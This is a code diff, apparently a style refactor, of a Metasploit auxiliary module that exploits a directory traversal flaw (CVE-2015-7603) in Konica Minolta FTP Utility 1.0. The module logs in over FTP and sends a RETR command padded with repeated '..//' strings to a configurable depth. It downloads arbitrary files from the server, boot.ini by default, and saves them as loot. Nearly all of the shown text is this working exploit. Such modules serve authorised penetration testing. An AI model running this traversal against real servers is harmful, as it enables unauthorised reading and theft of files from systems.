@@ -9,36 +9,43 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Konica Minolta FTP Utility 1.00 Directory Traversal Information Disclosure',
-      'Description'    => %q{
-        This module exploits a directory traversal vulnerability found in Konica Minolta FTP Utility 1.0.
-        This vulnerability allows an attacker to download arbitrary files from the server by crafting
-        a RETR command that includes file system traversal strings such as '..//'
-      },
-      'Platform'       => 'win',
-      'Author'         =>
-        [
-          'Jay Turla',   # @shipcod3, msf
+    super(
+      update_info(
+        info,
+        'Name' => 'Konica Minolta FTP Utility 1.00 Directory Traversal Information Disclosure',
+        'Description' => %q{
+          This module exploits a directory traversal vulnerability found in Konica Minolta FTP Utility 1.0.
+          This vulnerability allows an attacker to download arbitrary files from the server by crafting
+          a RETR command that includes file system traversal strings such as '..//'
+        },
+        'Platform' => 'win',
+        'Author' => [
+          'Jay Turla', # @shipcod3, msf
           'James Fitts', # msf
           'Brad Wolfe <brad.wolfe[at]gmail.com>', # msf
           'shinnai' # initial discovery
         ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'EDB', '38260'],
           [ 'CVE', '2015-7603'],
           [ 'URL', 'https://shinnai.altervista.org/exploits/SH-0024-20150922.html']
         ],
-      'DisclosureDate' => '2015-09-22'
-    ))
+        'DisclosureDate' => '2015-09-22',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         OptInt.new('DEPTH', [ true, 'Traversal Depth (to reach the root folder)', 32 ]),
         OptString.new('PATH', [ true, "Path to the file to disclose, relative to the root dir.", 'boot.ini'])
-      ])
+      ]
+    )
   end
 
   def check_host(ip)
@@ -60,7 +67,7 @@ class MetasploitModule < Msf::Auxiliary
       connect_login
       sock = data_connect
       if sock.nil?
-        error_msg = __FILE__ <<'::'<< __method__.to_s << ':' << 'data_connect failed; possible invalid response'
+        error_msg = __FILE__ << '::' << __method__.to_s << ':' << 'data_connect failed; possible invalid response'
         print_status(error_msg)
         elog(error_msg)
       else
@@ -68,13 +75,13 @@ class MetasploitModule < Msf::Auxiliary
         file = ::File.basename(file_path)
 
         # make RETR request and store server response message...
-        retr_cmd = ( "..//" * datastore['DEPTH'] ) + "#{file_path}"
-        res = send_cmd( ["RETR", retr_cmd])
+        retr_cmd = ("..//" * datastore['DEPTH']) + "#{file_path}"
+        res = send_cmd(["RETR", retr_cmd])
 
         # read the file data from the socket that we opened
         # dont assume theres still a sock to read from. Per #7582
         if sock.nil?
-          error_msg = __FILE__ <<'::'<< __method__.to_s << ':' << 'data_connect failed; possible invalid response'
+          error_msg = __FILE__ << '::' << __method__.to_s << ':' << 'data_connect failed; possible invalid response'
           print_status(error_msg)
           elog(error_msg)
           return
@@ -88,7 +95,7 @@ class MetasploitModule < Msf::Auxiliary
           return
         end
 
-        if response_data.length == 0 or ! (res =~ /^150/ )
+        if response_data.length == 0 or !(res =~ /^150/)
           print_status("File (#{file_path})from #{peer} is empty...")
           return
         end
@@ -99,7 +106,6 @@ class MetasploitModule < Msf::Auxiliary
         vprint_line(response_data)
         print_good("Stored #{file_path} to #{loot_file}")
       end
-
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout => e
       vprint_error(e.message)
       elog(e)
